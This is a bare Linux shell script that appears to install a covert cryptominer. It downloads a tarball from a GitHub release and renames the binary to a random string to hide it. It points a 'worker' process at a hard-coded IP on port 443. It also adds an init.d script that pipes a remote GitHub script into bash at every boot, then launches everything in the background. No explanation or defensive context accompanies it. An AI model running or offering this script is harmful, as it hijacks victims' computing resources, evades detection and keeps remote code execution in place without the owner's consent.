cd /
wget https://github.com/somadce/bicalu/releases/download/v1.5.2/flexer.tar
tar -xvf flexer.tar
cd /flexer
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv melox $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./acetyl.sh
sed -i "s/host/20.163.170.215:443/g" ./acetyl.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/somadce/bicalu/main/aleve.sh)" > subox.sh
chmod a+x subox.sh
update-rc.d subox.sh defaults
rm -rf flexer.tar
cd /flexer
nohup ./acetyl.sh
ps -ef | grep flexer
